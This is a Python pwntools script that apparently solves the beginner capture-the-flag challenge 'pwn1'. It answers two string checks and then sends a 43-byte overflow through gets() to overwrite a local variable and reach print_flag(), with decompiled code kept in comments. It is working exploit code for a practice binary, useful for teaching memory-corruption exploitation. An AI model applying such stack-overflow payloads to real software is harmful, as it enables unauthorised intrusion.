#!/usr/bin/python3
from pwn import *
# Connect to target process
target = process('./pwn1')
print(target.recvline(timeout=1).decode('utf-8'))
# Answer the questions then overflow the stack via gets()
# puts("What... is your name?");
#   fgets(local_43,0x2b,stdin);
#   iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
print(target.recvline(timeout=1).decode('utf-8'))
payload = b'Sir Lancelot of Camelot\n'
print(payload.decode('utf-8'))
target.send(payload)
#  puts("What... is your quest?");
#  fgets(local_43,0x2b,stdin);
#  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
print(target.recvline(timeout=1).decode('utf-8'))
payload = b'To seek the Holy Grail.\n'
print(payload.decode('utf-8'))
target.send(payload)
#  puts("What... is my secret?");
#   gets(local_43); - a buffer of length 43
#   if (local_18 == -0x215eef38) {
#     print_flag();
#   }
print(target.recvline(timeout=1).decode('utf-8'))
payload = b'a'*43 + b'\xc8\x10\xa1\xde'+b'\n'
target.send(payload)
target.recvline(timeout=1).decode('utf-8')
# Read the flag
log.info('Flag is ' + target.recvline(timeout=1).decode('utf-8'))
